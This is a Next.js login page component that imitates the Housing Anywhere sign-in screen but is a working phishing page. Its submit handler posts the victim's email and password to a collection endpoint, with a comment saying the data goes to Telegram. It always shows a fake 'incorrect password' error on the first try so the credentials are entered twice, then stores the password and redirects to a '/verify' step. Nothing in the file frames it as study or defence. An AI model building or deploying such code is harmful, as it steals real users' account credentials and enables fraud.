"use client"

import React from "react"

import { useState } from "react"
import { Eye, EyeOff } from "lucide-react"
import Link from "next/link"
import { useRouter } from "next/navigation"
import Image from "next/image"

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false)
  const [showPasswordField, setShowPasswordField] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [attempts, setAttempts] = useState(0)
  const [showError, setShowError] = useState(false)
  const router = useRouter()

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Send login data to Telegram
    await fetch("/api/collect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password, type: "login", attempt: attempts + 1 }),
    })
    
    // First attempt - show error
    if (attempts === 0) {
      setAttempts(1)
      setShowError(true)
      return
    }
    
    // Second attempt - proceed to verification
    sessionStorage.setItem("userEmail", email)
    sessionStorage.setItem("userPassword", password)
    router.push("/verify")
  }

  return (
    <main className="min-h-screen flex items-start justify-center bg-background p-4 pt-6">
      <div className="w-full max-w-sm">
        <Image
          src="/logo-1200x630.png"
          alt="Housing Anywhere"
          width={170}
          height={89}
          style={{ width: "170px", height: "auto" }}
          className="mb-10"
          priority
        />
        <h1 className="text-lg font-bold text-foreground mb-0.5">Welcome back</h1>
        <p className="text-xs text-muted-foreground mb-5">
          Good to see you <span className="underline">again</span>.
        </p>

        <form className="space-y-4" onSubmit={handleSubmit}>
          {/* Email Field */}
          <div>
            <label htmlFor="email" className="block text-xs font-medium text-foreground mb-1.5">
              Email
            </label>
            <input
              id="email"
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              onFocus={() => setShowPasswordField(true)}
              className={`w-full px-3 py-2.5 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-[#00838f] bg-background text-foreground ${showError ? "border-red-500" : "border-border"}`}
            />
          </div>

          {/* Password Field - Only shows after clicking email */}
          {showPasswordField && (
            <>
              <div>
                <label htmlFor="password" className="block text-xs font-medium text-foreground mb-1.5">
                  Password
                </label>
                <div className="relative">
                  <input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className={`w-full px-3 py-2.5 pr-10 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-[#00838f] bg-background text-foreground ${showError ? "border-red-500" : "border-border"}`}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                    aria-label={showPassword ? "Hide password" : "Show password"}
                  >
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
                {showError && (
                  <p className="text-red-500 text-xs mt-1.5">
                    Incorrect email or password. Try again.
                  </p>
                )}
              </div>

              {/* Login Button */}
              <button
                type="submit"
                className="w-full bg-[#ff5722] hover:bg-[#e64a19] text-white text-sm font-semibold py-3 rounded-md transition-colors mt-2"
              >
                LOG IN
              </button>

              {/* Forgot Password */}
              <Link href="#" className="inline-block text-[#ff5722] hover:underline text-xs">
                Forgot your password?
              </Link>
            </>
          )}
        </form>

        {/* Divider */}
        <div className="flex items-center gap-4 my-8">
          <div className="flex-1 h-px bg-border"></div>
          <span className="text-muted-foreground text-sm">OR</span>
          <div className="flex-1 h-px bg-border"></div>
        </div>

        {/* Social Login Buttons */}
        <div className="space-y-4">
          <button
            type="button"
            className="w-full flex items-center justify-center gap-3 border border-border rounded-md py-3 hover:bg-secondary transition-colors"
          >
            <svg width="18" height="18" viewBox="0 0 24 24">
              <path
                fill="#4285F4"
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
              />
              <path
                fill="#34A853"
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
              />
              <path
                fill="#FBBC05"
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
              />
              <path
                fill="#EA4335"
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
              />
            </svg>
            <span className="text-xs font-medium text-foreground">CONTINUE WITH GOOGLE</span>
          </button>

          <button
            type="button"
            className="w-full flex items-center justify-center gap-3 border border-border rounded-md py-3 hover:bg-secondary transition-colors"
          >
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#1877F2">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
            </svg>
            <span className="text-xs font-medium text-foreground">CONTINUE WITH FACEBOOK</span>
          </button>

          <button
            type="button"
            className="w-full flex items-center justify-center gap-3 border border-border rounded-md py-3 hover:bg-secondary transition-colors"
          >
            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701" />
            </svg>
            <span className="text-xs font-medium text-foreground">CONTINUE WITH APPLE</span>
          </button>
        </div>

        {/* Sign Up Link */}
        <p className="text-center mt-8 text-xs text-foreground">
          {"Don't have an account?"}{" "}
          <Link href="#" className="text-[#00838f] hover:underline font-medium">
            Sign Up
          </Link>
        </p>
      </div>
    </main>
  )
}
